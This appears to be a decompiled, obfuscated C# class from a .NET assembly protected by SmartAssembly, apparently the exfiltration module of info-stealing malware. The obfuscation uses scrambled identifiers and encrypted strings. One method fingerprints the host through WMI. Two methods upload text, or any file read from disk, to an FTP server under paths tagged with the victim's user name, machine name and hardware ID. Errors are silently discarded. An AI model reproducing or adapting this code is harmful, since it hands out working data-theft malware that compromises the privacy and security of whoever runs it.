using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace azCTgkmpGT;

internal sealed class AVKODeXgMr
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string RdWUiLAhRtYuk()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107348135));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107348626)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107348577);
			ManagementObject val3 = new ManagementObject(getString_0(107348572) + text2 + getString_0(107348563));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107348558)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107400956) : text;
		}
	}

	public static void UpldEXWvoGTdlQa(string ChWvBGYQmDbi = "URL", string EKmCrurIADaFc = "USERNAME", string nieksytmOkf = "ACCESO", string DxbNNPBIBBizVt = "")
	{
		try
		{
			string text = RdWUiLAhRtYuk();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(ChWvBGYQmDbi + getString_0(107349316) + Environment.UserName + getString_0(107349303) + Environment.MachineName + getString_0(107349282) + text + getString_0(107349277));
			ftpWebRequest.Method = getString_0(107348533);
			ftpWebRequest.Credentials = new NetworkCredential(EKmCrurIADaFc, nieksytmOkf);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(DxbNNPBIBBizVt);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void tvyItwYqcU(string zjtlgLWLtQvLpv = "URL", string WniCOdCizfuA = "USERNAME", string XKQSnRJpiJAeDn = "ACCESO", string ibwpSmjeHO = "")
	{
		try
		{
			string text = RdWUiLAhRtYuk();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(zjtlgLWLtQvLpv + getString_0(107349316) + Environment.UserName + getString_0(107349303) + Environment.MachineName + getString_0(107349282) + text + getString_0(107349282) + Path.GetFileName(ibwpSmjeHO));
			ftpWebRequest.Method = getString_0(107348533);
			ftpWebRequest.Credentials = new NetworkCredential(WniCOdCizfuA, XKQSnRJpiJAeDn);
			byte[] array = File.ReadAllBytes(ibwpSmjeHO);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static AVKODeXgMr()
	{
		Strings.CreateGetStringDelegate(typeof(AVKODeXgMr));
	}
}
